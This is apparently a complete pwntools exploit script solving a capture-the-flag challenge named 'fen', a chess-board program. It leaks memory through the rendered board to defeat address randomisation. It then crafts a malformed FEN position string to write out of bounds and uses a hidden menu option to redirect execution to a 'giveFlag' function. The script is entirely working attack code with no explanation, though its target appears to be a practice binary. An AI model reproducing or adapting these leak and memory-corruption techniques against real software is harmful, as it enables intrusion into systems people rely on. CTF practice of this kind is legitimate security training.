#!/usr/bin/env python3
from pwn import *

REMOTE = bool(args.REMOTE)

context.log_level = "warning"

exe = ELF("fen")
with context.local(log_level="error"):
	exedbg = ELF("fen.debug", checksec=False)
context(binary=exe)

if REMOTE:
	r = remote("127.0.0.1", 22001)
else:
	r = exe.process()
	# gdb.attach(r, """
	# 	b system
	# 	b exit
	# 	c
	# """)


# Handle password (if enabled)
initial = r.recvn(10, timeout=0.5)
if initial == b"Password: ":
	r.sendline(b"grand master of haxx")
	r.recvline()
else:
	r.unrecv(initial)


# ANSI white (bg)
SQUARE_WHITE = 47

# ANSI green (bg)
SQUARE_BLACK = 42

# ANSI bright black (bg)
BORDER_COLOR = 100

# ANSI bright white (fg)
PIECE_WHITE = 97

# ANSI bright black (fg)
PIECE_BLACK = 30


# Piece values
IS_BLACK = 0x80
NO_PIECE = 0
PAWN = 1
KNIGHT = 2
BISHOP = 3
ROOK = 4
QUEEN = 5
KING = 6

PIECES = " ♟♞♝♜♛♚"

pieces_addr = next(exe.search("....♟ ♞ ♝ ♜ ♛ ♚ ".encode("utf8")))
leak_table = {}
unique = 0
for i in range(128):
	chunk = exe.read(pieces_addr + i * 4, 4)
	
	if chunk in leak_table:
		leak_table[chunk].append(i)
	else:
		leak_table[chunk] = [i]
		unique += 1

info("Uniqueness score is %d%% (%d/128)" % (int(unique / 128.0 * 100.0), unique))

for k, v in leak_table.items():
	if len(v) > 1:
		info("Chunk %r maps to %d values: %r" % (k, len(v), " ".join(map(hex, v))))

def menu(r, choice):
	r.recvuntil(b"\n> ")
	r.sendline(str(choice))

def get_board(r):
	menu(r, 3)
	
	board = [0] * 64
	
	for rank in range(8, 0, -1):
		r.recvuntil(b"\033[%um%u " % (BORDER_COLOR, rank))
		line = r.recvuntil(b"\033[0m\n")
		pos = 0
		
		for col in range(8):
			cfile = col + 1
			is_square_white = (rank % 2) == (cfile % 2)
			
			if is_square_white:
				cur = b"%um" % SQUARE_WHITE
			else:
				cur = b"%um" % SQUARE_BLACK
			
			assert line[pos:].startswith(b"\033[")
			pos += len(b"\033[")
			
			# Read foreground color (piece white or black)
			fg = line[pos:].split(b";", 1)[0]
			pos += len(fg) + 1
			
			assert line[pos:].startswith(cur)
			pos += len(cur)
			
			cellstart = pos
			
			# Find next cell (be careful about "\033[%u...")
			while True:
				idx = line[pos:].index(b"\033[")
				pos += idx
				if chr(line[pos+2]).isdigit():
					break
				pos += 1
			
			cell = line[cellstart:pos]
			
			if int(fg) == PIECE_BLACK:
				value = IS_BLACK
			elif int(fg) == PIECE_WHITE:
				value = 0
			else:
				raise ValueError("Unexpected piece color: %u" % fg)
			
			if cell == b"  ":
				value |= 0
			elif len(cell) == 2:
				value |= int(cell, 16)
			elif cell.startswith(b"\xe2\x99"):
				text = cell.decode("utf8")
				assert text[1] == " "
				value |= PIECES.index(text[0])
			else:
				# Look up string chunk in table
				options = leak_table[cell]
				# info("%c%d is %r" % ("abcdefgh"[col], rank, " ".join(map(hex, options))))
				if len(options) == 1:
					value |= options[0]
				else:
					warning("Making a 1/%d guess..." % len(options))
					value |= random.choice(options)
			
			idx = (rank - 1) * 8 + col
			board[idx] = value
	
	return board


board = get_board(r)

leaks = [u64(bytes(board[i:i+8])) for i in range(0, 64, 8)]

exe_leak = leaks[5]

exe_seen = 0x55c5b4db53fd
csu_init_seen = 0x55c5b4db53b0

leak_offset = exe_seen - csu_init_seen

csu_init_leak = exe_leak - leak_offset

exe_slide = csu_init_leak - exedbg.symbols["__libc_csu_init"]

exe.address += exe_slide
exedbg.address += exe_slide

info("exe base address is %#x" % exe.address)


# Find target for return
# system_addr = hex(exedbg.symbols["system"])
# main_code = exe.disasm(exedbg.symbols["main"], exe.functions["main"].size)

# lines = main_code.split("\n")
# call_instructions = set(["call"])

# win_addr = None
# for i, insn in enumerate(lines):
# 	if "call" in insn.split():
# 		if system_addr in insn:
# 			win_addr = int(lines[i-1].split()[0].rstrip(":"), 16)

win_addr = exedbg.symbols["giveFlag"]
info("win_addr is %#x" % win_addr)


pos = 56
target = 76

# Unalign position
fen = b"1"
pos += 1

# Start moving out of bounds until we pass the target position
while pos < target:
	fen += b"8"
	pos += 8

# Re-align the position, which should jump back before target
fen += b"7"
pos -= 9

# Jump to target and write a single white pawn there
fen += b"%u" % (target - pos)
pos = target

fen += b"P"
pos += 1

if pos % 8 == 0:
	pos -= 16
else:
	align = 8 - pos % 8
	fen += b"%u" % align
	pos += align
	pos -= 16

while pos >= 0:
	fen += b"8"
	pos -= 8

fen += b" w - - 0 1"

# Load exploit FEN data
menu(r, 1)
r.sendline(fen)

# Trigger hidden menu item
menu(r, 1337)

# Send jump address
r.recvuntil(b"Make like a knight and jump!\n")
r.sendline(hex(win_addr))

# r.interactive()
print(r.recvline().decode("utf8").strip())
